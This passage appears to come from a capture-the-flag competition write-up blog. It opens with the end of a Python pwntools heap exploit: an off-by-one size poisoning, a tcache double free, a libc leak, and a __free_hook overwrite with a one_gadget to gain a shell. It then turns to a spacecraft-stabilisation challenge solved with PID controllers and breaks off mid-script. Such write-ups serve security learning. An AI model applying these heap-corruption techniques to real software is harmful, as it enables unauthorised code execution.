</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>16</span><span class=p>),</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>rb</span><span class=s1>&#39;0x(..)&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>pipe_id</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>pwn</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>post_msg</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=n>pipe_id</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>pwn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc_hex</span><span class=p>(</span><span class=n>pipe_id</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>post_msg</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=n>pipe_id</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>broadcast</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>post_msg</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>pipe_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>handle</span><span class=p>(</span><span class=n>pipe_id</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Fill pipe 0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;-&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Allocate a chunk of sz 0x140 (target chunk)</span>
</span></span><span class=line><span class=cl>    <span class=c1># this will get stored freed in the pipe 1</span>
</span></span><span class=line><span class=cl>    <span class=c1># At offset 0xf0 we create a fake next_chunk, so that when we overwrite the last byte</span>
</span></span><span class=line><span class=cl>    <span class=c1># of the sz = 0x140 to sz = 0x100 we will have a valid prev_inuse bit</span>
</span></span><span class=line><span class=cl>    <span class=n>broadcast</span><span class=p>(</span><span class=n>flat</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xf0</span><span class=p>:</span> <span class=p>[</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=n>filler</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=p>,</span> <span class=n>length</span> <span class=o>=</span> <span class=mh>0x130</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Empty pipe 0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Allocate a chunk before the target chunk and use the off-by-one</span>
</span></span><span class=line><span class=cl>    <span class=c1># to poison the size</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc_hex</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x1e8</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Free target chunk again to put it in another tcache</span>
</span></span><span class=line><span class=cl>    <span class=c1># Now that the size is changed we can free it again</span>
</span></span><span class=line><span class=cl>    <span class=c1># and we will not cause a double-free abort as the target tcache bin is different</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Empty pipe 0</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Fill pipe 0 with all small and last big</span>
</span></span><span class=line><span class=cl>    <span class=c1># This big chunk will end up in unsorted bin when freed</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;F&#39;</span> <span class=o>*</span> <span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;.&#39;</span> <span class=o>*</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Add padding after the chunk that will end in unsorted</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;.&#39;</span> <span class=o>*</span> <span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Put chunk in unsorted, now pipe 0 has 9/10 messages</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Fill pipe 0</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;.&#39;</span> <span class=o>*</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Broadcast, this will reclaim the unsorted, free it and put it in pipe 1</span>
</span></span><span class=line><span class=cl>    <span class=n>broadcast</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;@&#39;</span> <span class=o>*</span> <span class=mh>0xf00</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Alloc a small portion from the unsorted bin</span>
</span></span><span class=line><span class=cl>    <span class=c1># so that when the freed message in pipe 1 is received</span>
</span></span><span class=line><span class=cl>    <span class=c1># we will free this message without crashing and also</span>
</span></span><span class=line><span class=cl>    <span class=c1># leaking the pointers from the unsorted right after this chunk</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;W&#39;</span> <span class=o>*</span> <span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Remove padding chunk from pipe 1</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Leak libc from unsorted</span>
</span></span><span class=line><span class=cl>    <span class=c1># This is when the 0x50 sized buffer is freed to prevent double freeing the unsorted</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>107</span><span class=p>:</span><span class=mi>107</span><span class=o>+</span><span class=mi>6</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main_arena</span> <span class=o>-</span> <span class=mi>96</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;libc leak : 0x</span><span class=si>%x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>libc_leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s2>&#34;libc base : 0x</span><span class=si>%x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Empty pipe 0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span> <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Use the double freed tcache entry to get arb write</span>
</span></span><span class=line><span class=cl>    <span class=c1># and overwrite __free_hook with a one_gadget</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>__free_hook</span> <span class=o>-</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;X&#34;</span><span class=o>*</span><span class=mh>0x128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0xe3b01</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0xe0</span><span class=p>,</span> <span class=n>pwn</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">You&rsquo;ve Been Promoted<div id=youve-been-promoted class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#youve-been-promoted aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-5 aria-label=Anchor>#</a></span></h3><p><strong>Category</strong>: &ldquo;Anomaly Review Bored&rdquo;</p><h4 class="relative group">Description<div id=description-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-5 aria-label=Anchor>#</a></span></h4><p>This challenge consists of a remote TCP service for which we are not given any source or binary. When connecting to the given address (e.g., through Netcat), we are greeted with the following information:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ nc management.quals2023-kah5Aiv9.satellitesabove.me <span class=m>5300</span>
</span></span><span class=line><span class=cl>Send me commands to get the spacecraft under control and the spacecraft despun
</span></span><span class=line><span class=cl>You must run <span class=k>for</span> <span class=m>3600</span> seconds
</span></span><span class=line><span class=cl>Make sure the magnitude of the spacecraft angular velocity vector is less than 0.001 <span class=o>(</span>rad/s<span class=o>)</span>
</span></span><span class=line><span class=cl>Make sure each reaction wheel has a spin rate that is between -20 and <span class=m>20</span> <span class=o>(</span>rad/s<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Reaction wheels accept torque commands in N-m
</span></span><span class=line><span class=cl>Reaction wheel commands are valid between <span class=o>[</span>-0.2, 0.2<span class=o>]</span> N-m
</span></span><span class=line><span class=cl>Available reaction wheels:
</span></span><span class=line><span class=cl>- Wheel_X: aligned with body X axis
</span></span><span class=line><span class=cl>- Wheel_Y: aligned with body Y axis
</span></span><span class=line><span class=cl>- Wheel_Z: aligned with body Z axis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Magnetic Torquer Bars <span class=o>(</span>MTB<span class=o>)</span> accept commands in magnetic dipole <span class=o>(</span>A-m^2<span class=o>)</span>
</span></span><span class=line><span class=cl>MTB dipole commands are valid between <span class=o>[</span>-1000.0, 1000.0<span class=o>]</span> <span class=o>(</span>A-m^2<span class=o>)</span>
</span></span><span class=line><span class=cl>Available MTB
</span></span><span class=line><span class=cl>- MTB_X: aligned with body X axis
</span></span><span class=line><span class=cl>- MTB_Y: aligned with body Y axis
</span></span><span class=line><span class=cl>- MTB_Z: aligned with body Z axis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Actuator commands are formatted as:
</span></span><span class=line><span class=cl>Wheel_X, Wheel_Y, Wheel_Z, MTB_X, MTB_Y, MTB_Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Sensor:Time <span class=o>(</span>sec<span class=o>)</span>, AngV_X <span class=o>(</span>rad/s<span class=o>)</span>, AngV_Y <span class=o>(</span>rad/s<span class=o>))</span>, AngV_Z<span class=o>(</span>rad/s<span class=o>)</span>, WheelX<span class=o>(</span>rad/s<span class=o>)</span>, WheelY<span class=o>(</span>rad/s<span class=o>)</span>, WheelZ<span class=o>(</span>rad/s<span class=o>)</span>, magX <span class=o>(</span>T<span class=o>)</span>, magY<span class=o>(</span>T<span class=o>)</span>, magZ<span class=o>(</span>T<span class=o>)</span>
</span></span><span class=line><span class=cl>0.0,0.1,0.1,-0.2,314.1592653589793,-471.23889803846896,282.7433388230814,-3.210377245457677e-05,-1.1355247439189624e-05,-2.263494595823975e-05
</span></span><span class=line><span class=cl>Enter actuator command: nan,nan,nan,nan,nan,nan
</span></span><span class=line><span class=cl>Array item nan is not finite.
</span></span><span class=line><span class=cl>Expected format of array input is <span class=s1>&#39;X1,X2,X3,....,XN&#39;</span>
</span></span></code></pre></div><p>The remote server is asking us to help controlling a spinning spacecraft through three-axis stabilization. The spacecraft is in fact equipped with 3 reaction wheels (RW) and 3 magnetic torque bars (MTB), each mounted on a different axis.</p><p>Each second of time we receive sensor readings for the current angular speed of the spacecraft on each axis (in rad/s), the current angular speed of each RW in (rad/s), and the current magnetic field strenght (in Tesla) measured by the spacecraft on each axis.</p><p>To perform three-axis stabilization, each second of time we can apply a chosen torque (between -0.2Nm and +0.2Nm) to each RW and a chosen magnetic dipole (between -1000Am<sup>2</sup> and +1000Am<sup>2</sup>) to each MTB. We have 3600 seconds to get the spacecraft&rsquo;s angular velocity within -0.001 and 0.001 rad/s on all 3 axes and the angular velocity of all reaction wheels within -20 and +20 rad/s. If, at the end of the 3600th second, all requested values are found within range, the spacecraft will be considered stabilized.</p><h3 class="relative group">Solution<div id=solution-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-5 aria-label=Anchor>#</a></span></h3><p>The system that is being emulated by the server seems to be a standard three-axis stabilization problem:</p><ul><li>Torque can be applied to reaction wheels to make them accelerate and spin either clockwise or counterclockwise to contrast the spacecraft spin on each axis.</li><li>Magnetic torque bars can be powered with a positive or negative current to provide the whole spacecraft with positive or negative torque perpendicular to the magnetic field.</li></ul><p>To reach our goal, we can control the spin of the spacecraft itself through the RWs, and the spin of the RWs through the MTBs.</p><p>We implemented our solution using the <a href=https://pypi.org/project/simple-pid/ target=_blank><code>simple-pid</code></a> Python package to model 6 PID controllers (one for each RW and MTB) as follows:</p><ul><li>3 PIDs (one per axis) each taking the negated angular velocity of the spacecraft on the corresponding axis as input. The produced response, limited between -0.2 and +0.2, is then provided as the torque to apply to the RWs (one per axis).</li><li>3 PIDs (one per axis) each taking one negated component (on the corresponding axis) of the cross product <em>W⨯B</em>, where <em>W</em> is the vector <em>(WheelX, WheelY, WheelZ) [rad/s]</em>, and <em>B</em> is the magnetic field vector <em>(magX, magY, magZ) [T]</em>. The produced response, limited between -1000 and +1000, is then provided as the elecric dipole to apply to the MTBs (one per axis).</li></ul><p>Theoretically speaking, determining the right magnetic dipole to control the MTBs is not simple, because we ideally want them to produce a torque that counters the spin of the RWs, but the only torque the MTBs can generate is perpendicular to the magnetic field felt by the spaceship at any given time. The equation to calculate the applied torque given a magnetic dipole (<em>M</em>) is <em>T = M⨯B</em>. It is however not possible to simply invert the equation and find <em>M</em> given <em>T</em> and <em>B</em>, as the matrix used for the cross-product (<em>[(0,Bz,-By), (-Bz,0,Bx), (By,-Bx,0)]</em>) is non-invertible.</p><p>Knowing the above, although seemingly nonsensical at first glance (even just dimensionally speaking), the intuitive reasoning we followed to come up with <em>W⨯B</em> was as follows:</p><ol><li>The torque we want to apply on each axis needs to be opposite in sign and directly proportional in modulus to the angular velocity of the RWs.</li><li>The torque we can apply is perpendicular to both the magnetic field and the applied magnetic dipole (<em>T = M⨯B</em>).</li><li>Therefore the magnetic dipole vector to apply needs to be proportional in modulus and opposite in direction to <em>W⨯B</em>.</li></ol><p>After figuring out the above, the rest was a matter of trial and error and manual tuning. Running multiple simulations, we ended up with the following PID parameters:</p><ul><li><em>(Kp, Ki, Kd) = (5, 0.5, 0.1)</em> for the 3 RW PIDs</li><li><em>(Kp, Ki, Kd) = (10<sup>5</sup>, 10<sup>4</sup>, 5•10<sup>4</sup>)</em> for the 2 MTB PIDs for the x-axis and z-axis</li><li><em>(Kp, Ki, Kd) = (3•10<sup>5</sup>, 10<sup>5</sup>, 10<sup>5</sup>)</em> for the MTB PID for the y-axis.</li></ul><p>While doing this, we also noticed that stabilizing both the spacecraft&rsquo;s angular velocity and the RWs&rsquo; angular velocity was harder than expected, because PID responses were in turn altering other PIDs inputs. In other words, reducing the angular velocity of the spaceship along one axis means increasing the angular velocity of the RW for that axis, and reducing the angular velocity of a RW for one axis through MTBs could mean altering the angular velocity of the spacecraft on any axis.</p><p>In order to get over this issue, we manually defined some time windows within which we would generate a response for the torque to apply to the RWs. Outside these time windows, the response would just be <code>0</code> on all axes. We ended up applying torque to RWs only between t=500s and t=999s seconds, and then from t=2500s onwards.</p><h3 class="relative group">Solution script<div id=solution-script-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-script-1 aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># @mebeim - 2023-04-02</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>simple_pid</span> <span class=kn>import</span> <span class=n>PID</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TIME</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>faketime</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=k>global</span> <span class=n>TIME</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>TIME</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwx</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mf>.5</span><span class=p>,</span> <span class=mf>.1</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mf>0.2</span><span class=p>,</span> <span class=mf>0.2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pwy</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mf>.5</span><span class=p>,</span> <span class=mf>.1</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mf>0.2</span><span class=p>,</span> <span class=mf>0.2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pwz</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mf>.5</span><span class=p>,</span> <span class=mf>.1</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mf>0.2</span><span class=p>,</span> <span class=mf>0.2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwx</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl><span class=n>pwy</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl><span class=n>pwz</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pmx</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mf>1e5</span><span class=p>,</span> <span class=mf>1e4</span><span class=p>,</span> <span class=mf>5e4</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mi>1000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pmy</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mf>3e4</span><span class=p>,</span> <span class=mf>1e5</span><span class=p>,</span> <span class=mf>1e5</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mi>1000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pmz</span> <span class=o>=</span> <span class=n>PID</span><span class=p>(</span><span class=mf>1e5</span><span class=p>,</span> <span class=mf>1e4</span><span class=p>,</span> <span class=mf>5e4</span><span class=p>,</span> <span class=n>setpoint</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>sample_time</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>output_limits</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=mi>1000</span><span class=p>,</span> <span class=mi>1000</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pmx</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl><span class=n>pmy</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl><span class=n>pmz</span><span class=o>.</span><span class=n>time_fn</span> <span class=o>=</span> <span class=n>faketime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_sensors</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Sensor:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nb>tuple</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>float</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>VSLOTS</span> <span class=o>=</span> <span class=p>[</span><span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>,</span> <span class=mi>1000</span><span class=p>),</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2500</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>WSLOTS</span> <span class=o>=</span> <span class=p>[</span><span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>react</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=n>vx</span><span class=p>,</span> <span class=n>vy</span><span class=p>,</span> <span class=n>vz</span><span class=p>,</span> <span class=n>wx</span><span class=p>,</span> <span class=n>wy</span><span class=p>,</span> <span class=n>wz</span><span class=p>,</span> <span class=n>bx</span><span class=p>,</span> <span class=n>by</span><span class=p>,</span> <span class=n>bz</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>global</span> <span class=n>TIME</span>
